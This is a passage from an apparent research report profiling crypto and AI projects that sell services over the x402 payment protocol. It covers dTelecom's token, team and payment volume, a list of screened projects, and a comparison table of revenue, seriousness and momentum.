**Sources (accessed 2026-10-11)**: https://clusterprotocol.ai ; https://api.clusterprotocol.ai/.well-known/x402 ; https://cluster-protocol.gitbook.io/whitepaper (llms.txt, tokenomics.md) ; https://www.coingecko.com/en/coins/cluster-protocol ; https://t.me/clusterprotocolann ; https://github.com/clusterprotocol ; x402scan transfers (Method note).

### 6b. dTelecom (DTEL)

Note: the DTEL contract and launch date, ownership of the paying wallets, and the funding claims are unconfirmed (see Gaps).

**One-line**: Decentralized real-time voice/video network (WebRTC, speech-to-text, text-to-speech) with a gateway that sells credits to AI agents over x402. ([dtelecom.org](https://dtelecom.org), [gateway](https://x402.dtelecom.org))
**x402 role**: seller plus tooling. `POST /v1/credits/purchase` (USDC on Solana or Base), MPP on Tempo, USDT on TRON; prices WebRTC $0.001 per participant-minute, STT $0.006/min, TTS $0.008 per 1K characters. SDKs: `x402-client`, `agents-js`, `stt-mcp`, STT clients ([GitHub](https://github.com/dTelecom)).
**Chains**: token and node network on Solana; x402 volume on Base ($112k on Base vs $16 on Solana per x402scan).
**Token**: DTEL on Solana per the dTelecom site and CoinGecko; contract and launch date not stated on the pages read; no Base token. Utility: network token (node rewards).
**Team**: CEO Petr Malyukov (named as CEO in a dTelecom post, 2026-02-04); main GitHub committer `fffilimonov` (profile name "Vadim", no X). Company X `@dtelecom`.
**Track record**: GitHub org since 2022-11-14; apps dMeet (iOS/Android 2025-12-11) and FROGY livestreaming; startup grants (2026-02-05); self-reported "$1.2M raised" (2025-12-30 post) and backers Solana Foundation, Google, peaq, ElevenLabs (2026-02-10 post), not verified.
**Trend-hopping score**: 2. Real-time infrastructure throughout; AI-agent voice and x402 are extensions.
**x402 analysis**: first payment 2026-02-10 (matches the 2026-02-11 "first x402 real-time STT" post). 52,881 tx, $112,337, 59 wallets. Monthly: Jun $2,676; Jul $30,786; Aug $30,830; Sep $35,238; Oct 1-11 $12,771; roughly 14-16k tx a month, $0.5-$15 per credit purchase, about 25 recurring wallets, top-five payers 11%, 9%, 9%, 8%, 6% of dollars. Plausibly the company's own apps or a few integrators; not independently verified.
**Last six months**: GitHub: `secure-chat-client` 26 commits (May 21, Jun 5), `docs` 1 (Jul 30); `x402-client` and `agents-js` have no commits since 2026-03-05 and 2026-03-16. Telegram: 2026-07-20 dMeet Team Workspaces; 2026-09-30 meeting recording in dMeet.
**Pace**: product moves monthly; the x402 SDK is stale.
**Direction**: voice/video infrastructure for agents and apps; x402 is the agent on-ramp.
**Competitors**: Twilio, LiveKit and Deepgram (the incumbents dtelecom.org compares itself with); on x402, Venice, BlockRun and Cluster for AI APIs.
**Flags**: Green: shipping apps, real service, named CEO; Red: concentrated payers; SDK stale; token not on Base.
**Verdict**: **Credible but small. Momentum: Steady.**
**Tracking card**: https://dtelecom.org ; docs https://docs.dtelecom.org ; GitHub https://github.com/dTelecom ; Telegram https://t.me/dTelecomNetwork ; Discord https://discord.gg/dtelecom ; x402scan origin `ed6e501d-6817-400e-8e6c-810222318856`, payTo `0x47d3394c7234714e4b9e9b74827c12be847f9dda`, facilitator coinbase.
**Gaps**: token contract and launch; wallet ownership; funding verification.
**Sources (accessed 2026-10-11)**: https://dtelecom.org ; https://x402.dtelecom.org ; https://github.com/dTelecom ; https://t.me/dTelecomNetwork ; https://www.coingecko.com/en/coins/dtelecom ; x402scan transfers (Method note).

### 6c. Screened and not profiled

Token status of several rows below was not checked; "no token found" means none on the project's own site or in the pages read.

| Name | Why not profiled |
|---|---|
| BlockRun | Largest real x402 AI seller by tx ($480k Base and $293k Solana all-time, 28.9M tx claimed), but no token found on its site |
| Nansen, Messari, Zapper, Neynar | Incumbent data sellers, no token found; $179-$1,119 all-time on Base (Nansen $1,119, Messari $531, Zapper $287, Neynar $179) |
| Arkham (ARKM) | Token is on Ethereum (no Base contract on CoinGecko); $1,005 all-time, $141 in 30 days |
| Pocket Network (POKT) | Base contract exists; x402 $70 all-time |
| AUBRAI (VitaDAO-linked), Slinky Layer, Jatevo, MiroShark, Neurobro, Capminal | In CoinGecko's x402 category or token-linked; each about $1,100 or less all-time on Base (Slinky Layer: 3,144 payers for $30 in 30 days, which looks like micro-payment farming; inference) |
| Anyspend (ANY), Treasure (MAGIC), Heurist, PayAI, CodeNut, Meridian | Facilitators or covered by other researchers |
| Virtuals ACP, Daydreams | Platform/framework layer, covered elsewhere |
| Mint-era and token-style sellers: Arvos ($11.5M all-time, last 2025-11-28), Barvis and Canza (last 2025-11-28), AI Ape (last 2026-01-12), AinX402 (last 2026-08-30), QRBase $SCAN (last 2026-08-31) | High counts, wash-like or token-experiment profile; covered by the token-experiments researcher, not profiled here |
| KORUS, AX1, X Pay, Laso, FortClaw, Keyring Agent, BotPay, claw402, ATXP, AIsa, Lucy, t54, 100xSOON | No token found or not checked; not data/AI token sellers or consumer apps |
| Elfa, Kaito | No Base x402 origin found on x402scan or in the Bazaar search |

---

## Comparison table

| Project | x402 role | Token (chain, launch) | x402 revenue estimate (Base) | Seriousness | Momentum | Trend-hopping (1-5) |
|---|---|---|---|---|---|---|
| Gloria AI | Seller (4 endpoints, MCP); side channel | GLORIA, Base, Virtuals 2025-05-07 | $359 all-time; $59 window; $1 last 30d | Credible but small | Slowing | 2 |
| Otto AI | Seller (84 endpoints), router; one of four channels | OTTO, Base, Virtuals Unicorn 2025-10-16 | $433 all-time; $404 window ($231 ex-bot); $30 last 30d | Credible but small | Steady | 4 |
| AIXBT | Seller (2 legacy endpoints, now 404) | AIXBT, Base (+ETH, Solana), Virtuals 2024-11-02 | $2,766 all-time; $354 window; $0 last 30d | Credible but small | Steady | 2 |
| Cookie DAO | None found | COOKIE, BNB/ETH/Base, VC-backed TGE June 2024 | $0 | Credible but small | Slowing (relaunching) | 3 |
| Venice | Seller (prepaid top-up model) + SDK; side channel | VVV and DIEM, Base, airdrop 2025-01-27 / DIEM 2025-08-20 | $5,279 all-time; $5,153 window; $3,103 last 30d (whales included) | Serious builder | Accelerating | 1 |
| Cluster Protocol | Seller (AI gateway, 9 endpoints) | CP, Base, TGE 2026-09-02 | $262k all-time; $54.8k last 30d; synthetic-looking | Speculative | Steady (event-driven) | 4 |
| dTelecom | Seller (credits) + SDK | DTEL, Solana (no Base token) | $112k all-time; $36k last 30d; about 25 wallets | Credible but small | Steady | 2 |
